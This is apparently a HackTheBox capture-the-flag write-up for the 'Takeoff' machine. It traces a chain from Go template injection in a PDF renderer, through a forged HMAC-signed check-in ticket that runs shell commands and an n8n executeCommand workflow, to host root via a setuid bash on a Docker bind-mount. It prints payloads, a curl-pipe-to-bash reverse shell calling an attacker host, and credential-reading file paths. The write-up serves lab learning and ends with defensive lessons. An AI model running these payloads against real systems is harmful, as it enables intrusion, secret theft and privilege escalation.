# Takeoff — HTB Write-up

**Author:** DonMorpheus (lab)
**Machine:** Takeoff (Release Arena, Linux)
**Host:** `takeoff.htb`
**Scope:** HTB VPN / personal lab only

> **No flags** in this document.

Scripts: [`scripts/`](scripts/).

---

## TL;DR

| Phase | Vector |
|-------|--------|
| Recon | 22 OpenSSH, 80 nginx + Echo. Airline booking SPA (HTMX). MySQL and n8n only on localhost (Docker). |
| Foothold | Ticket **notes** are `text/template`. Method `File` on the notes context. Sink is the **PDF**, not the HTML page. |
| Leak | `/proc/self/environ` → HMAC key for check-in + n8n public API key. |
| RCE | Check-in QR is gob `*gob.VerifyTicketAuthenticity` plus HMAC-SHA256. `NotifyCmd` is executed as `www-data`. |
| User | n8n `executeCommand` as **root in the container**. Container `/root` is a bind-mount of a host user's `$HOME`. |
| Root | That mount is `rw`, no `nosuid`, no user-namespace remapping. Host `bash` copied in, `chmod 4755` from the container, run `-p` on the host. |

```
Kali tun0
  │
  ├─ 80  nginx  Echo  :3000 (htb-air, www-data)
  │         notes → PDF  {{.File}}
  │         POST /api/check-in  gob+HMAC  NotifyCmd
  │
  └─ box  takeoff.htb
        127.0.0.1:3306  MySQL (Docker)
        127.0.0.1:5678  n8n  (Docker, uid 0)
        bind /home/<user> → container /root
```

---

## 1. Recon

```bash
echo '<TARGET_IP> takeoff.htb' | sudo tee -a /etc/hosts
nmap -sC -sV <TARGET_IP>
```

Open from VPN: **22**, **80**. `X-Powered-By: Echo`. JWT session cookie `iss=takeoff.htb`.

Auth pages: `POST /sign-up` (`name`, `email`, `password`, `terms`), `POST /sign-in`. After login: `/search`, `/trips`, `/check-in`, `/boards`, `/payment-cards`.

Booking: `GET /search/results?origin=HTB&destination=GLW&date=YYYY-MM-DD` → `/schedules/<id>` → `POST /book/start` (`schedule_id`, `seat_ids`) → passengers → `POST /book/<PNR>/payment`. Test card `4242…4242` is accepted.

Help text mentions `/airports/<code>` boards. n8n and MySQL are **not** on the external surface.

Dead ends that look real: a current-looking sudo, a custom sysmon-style root service, world-writable `/opt/n8n`. The intended chain never needs them.

---

## 2. SSTI in ticket notes

`POST /tickets/<PNR>/notes` field `notes`. The trip HTML **escapes** `{{` (`&#34;`), so a Jinja-style test on the page is a false negative.

The boarding-pass **PDF** (`GET /tickets/<PNR>/download`) and `/tickets/<PNR>/preview` run the string through Go `text/template`.

Dump the context first:

```
{{printf "%T" .}}
{{printf "%#v" .}}
```

You get `*handlers.notesCtx` with `Request` and `User`. Exported methods are callable:

```
{{.File "/etc/passwd"}}
```

That is the custom file-read. It is a **method**, not a FuncMap name (`{{file …}}` / `{{readFile …}}` stay literal). Sprig `env` is not loaded.

Useful reads:

| Path | Why |
|------|-----|
| `/etc/passwd` | host users (two unprivileged accounts) |
| `/proc/self/cmdline` | `/opt/htb-airways/booking/htb-air` |
| `/proc/self/environ` | HMAC key + n8n API key |
| `/lib/systemd/system/htb-air.service` | same env, `ProtectHome=true`, `PrivateTmp=true` |

`pdftotext -raw` wraps lines. Quote the file so NULs survive:

```
{{printf "%q" (.File "/proc/self/environ")}}
```

`01-book.py` + `02-ssti-read.py` do the booking and the PDF pull.

**Lesson:** always find the **render sink**. Escaped HTML ≠ no SSTI. In Go, start with `printf` builtins, then exported methods on `.`.

---

## 3. Forged check-in (www-data)

`GET /partials/check-in` after a confirmed booking. Hidden field `qr_data` is base64. Decoded:

1. gob encoding of an **interface** holding `*VerifyTicketAuthenticity`
2. registered name `*gob.VerifyTicketAuthenticity` (the leading `*` is required)
3. one field `Data []byte` = JSON
4. gob struct terminator `0x00`
5. **32 raw bytes** HMAC-SHA256(`TICKET_VALIDATION_TOKEN`, gob-without-mac)

JSON:

```json
{
  "PNR": "...",
  "Token": "<ticket token hex>",
  "Seat": "11A",
  "Passenger": "...",
  "NotifyCmd": "check-in-notify --pnr ... --email ..."
}
```

The app verifies the MAC, then runs `NotifyCmd` (shell). The key is in the process environment, so the MAC is forgeable.

```go
gob.RegisterName("*gob.VerifyTicketAuthenticity", (*VerifyTicketAuthenticity)(nil))
var v any = &VerifyTicketAuthenticity{Data: jsonBytes}
enc.Encode(&v)
mac := hmac.New(sha256.New, []byte(token))
mac.Write(gobBytes)
blob := append(gobBytes, mac.Sum(nil)...)
```

A value-type register **without** the `*` produces a 1-byte-shorter type name and fails verification. Match the original blob on the **unmodified** JSON before changing `NotifyCmd`.

`POST /api/check-in` (`qr_data`, `gate=WEB`). A short command (`curl http://LHOST/pwned`) returns `{"status":"ok"}` and the HTTP callback. A reverse shell blocks the HTTP client; the callback is already up.

```bash
nc -lvnp 4444
python3 scripts/03-checkin-rce.py --cmd 'curl -s http://LHOST:8888/rev.sh | bash'
```

`htb-air` has `ProtectHome=true` / `RestrictSUIDSGID=true`. That only constrains this unit. `www-data` can still talk to `127.0.0.1:5678`.

**Lesson:** never put an OS command inside an authenticable blob if the MAC key lives next to the web process. gob is not encryption.

---

## 4. n8n as container root (user flag)

n8n listens on `127.0.0.1:5678`. The leaked JWT has `"aud":"public-api"`. Header: `X-N8N-API-KEY`.

`NODES_EXCLUDE` is empty — `n8n-nodes-base.executeCommand` is allowed. The public API has no “run now”; use a Webhook, activate, hit the production URL.

```
POST /api/v1/workflows          # body: scripts/wf-flex.json
POST /api/v1/workflows/{id}/activate
GET  /webhook/flex?cmd=id
```

The flex workflow uses `command: "={{$json.query.cmd}}"`. Response mode `lastNode` returns stdout in JSON.

The command runs as **uid 0 inside the n8n container**. Container `/root` is a bind of the host user's home (uid 1001 on the host). The user flag is there. `user.txt` is `root:1001` `0640` — the host user cannot read it, container root can.

Run `04-n8n-exec.py` from the `www-data` shell (or `NotifyCmd: curl http://LHOST/n8n.sh | bash`).

**Lesson:** n8n (and similar automators) running as root in Docker is a second computer. The API key is equivalent to that computer's shell.

---

## 5. Bind-mount → host root

`/proc/mounts` in the container:

```
/dev/sda4  /root  ext4  rw,relatime,errors=remount-ro
```

No `nosuid`. No `uid=` mapping. Files written as container uid 0 appear as **host uid 0**.

Do **not** setuid the container's Alpine busybox (musl) and expect it to run on Debian glibc. Copy the **host** ELF:

1. Drop an SSH pubkey into the bind-mount (`mkdir /root/.ssh`, `chown 1001:1001`) so you can log in as that host user.
2. As the host user: `cp /bin/bash ~/rootbash`
3. As container root: `chown root:root /root/rootbash && chmod 4755 /root/rootbash`
4. As the host user: `./rootbash -p` → `euid=0`

Root flag is `/root/root.txt` on the host.

**Lesson:** Docker bind-mount + container root + no userns + no `nosuid` is host-root on that inode. `ProtectHome` on the web unit does not protect a mount you write from another container.

---

## What this box is teaching

1. **Go templates** — builtins first (`printf`), then methods on `.`. HTML escape ≠ no execution; find the other renderer (PDF here).
2. **Signed gadgets** — HMAC over gob, key in env, OS command in the payload. Classic “forge the ticket”.
3. **Local automators** — n8n/Airflow/etc. on loopback with a leaked API key.
4. **Container identity** — bind-mounts inherit host uids when userns-remap is off. `nosuid` is the flag that would have stopped the last step.

## Scripts

See [`scripts/README.md`](scripts/README.md). Lab / HTB VPN only.
